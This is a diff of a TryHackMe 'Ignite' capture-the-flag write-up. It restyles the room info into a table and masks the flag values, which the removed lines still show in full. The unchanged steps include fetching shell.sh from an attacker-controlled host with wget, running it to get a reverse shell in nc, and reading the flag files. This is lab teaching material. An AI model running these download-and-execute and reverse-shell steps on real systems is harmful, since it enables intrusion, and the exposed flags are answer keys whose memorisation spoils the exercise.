@@ -2,21 +2,17 @@
 
 ![tryhackme.com - © TryHackMe](.gitbook/assets/tryhackme-logo-small.png)
 
-## Room Info
+## Intro
 
-> **Name**
->
-> 🔗 [Ignite](https://tryhackme.com/room/ignite)
->
-> ![](.gitbook/assets/ignite.png)
->
-> **Description**
->
-> 📝 *A new start-up has a few issues with their web server.*
->
-> **Target IP**
->
-> 🎯 `10.10.174.21`
+| Room Info           | ![](.gitbook/assets/ignite.png)             |
+| :------------------ | ------------------------------------------- |
+| 🔗 Name              | [Ignite](https://tryhackme.com/room/ignite) |
+| 🎯 Target IP         | `10.10.174.21`                              |
+| 📈 Difficulty level  | 🟢Easy                                       |
+| 💲 Subscription type | Free                                        |
+| 🪟 🐧OS               | Linux                                       |
+
+---
 
 ## Recon
 
@@ -92,23 +88,17 @@ wget http://10.18.65.48:8000/shell.sh -O shell.sh
 bash shell.sh
 ```
 
-* Reverse shell received in the `nc` terminal
+* 🚩 Reverse shell received in the `nc` terminal
 
 ```bash
 /usr/bin/script -qc /bin/bash /dev/null
 cd /home/www-data
 ls
 cat flag.txt
+6470e***************************
 ```
 
-<details>
-<summary>Reveal Flag - user.txt: 🚩</summary>
-
-`6470e394cbf6dab6a91682cc8585059b`
-
-<img src=".gitbook/assets/image-20230511171954548.png" alt="" data-size="original">
-
-</details>
+---
 
 ## Privilege Escalation
 
@@ -153,16 +143,10 @@ su root
 whoami
 cd
 cat root.txt
+b9bbc**************************
 ```
 
-<details>
 
-<summary>Reveal Flag - root.txt: 🚩</summary>
-
-`b9bbcb33e11b80be759c4e844862482`
-
-<img src=".gitbook/assets/image-20230511175207984.png" alt="" data-size="original">
-
-</details>
+![](.gitbook/assets/2024-10-20_22-24-49_763.png)
 
 ***
